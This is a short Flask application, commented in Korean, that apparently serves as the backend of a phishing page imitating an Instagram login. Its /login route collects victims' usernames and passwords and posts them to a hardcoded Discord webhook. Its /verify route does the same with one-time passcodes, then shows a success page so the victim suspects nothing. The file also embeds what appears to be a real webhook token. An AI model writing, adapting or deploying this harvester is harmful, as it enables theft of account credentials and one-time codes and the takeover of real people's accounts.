from flask import Flask, render_template, request, session, redirect
import requests

app = Flask(__name__)
app.secret_key = "insta_secure_key_z"

# 아이디, 비번, OTP 수신용 웹훅
WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    session['username'] = username
    
    data = {"content": f"🚨 **정보 수집**\nID: `{username}`\nPW: `{password}`"}
    requests.post(WEBHOOK_URL, json=data)
    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('otp_code')
    username = session.get('username', 'Unknown')
    
    data = {"content": f"🔑 **OTP 수신**\n유저: `{username}`\n코드: **{otp_code}**"}
    requests.post(WEBHOOK_URL, json=data)
    
    # 수정 포인트: 고퀄리티 성공 페이지로 이동
    return render_template('success.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
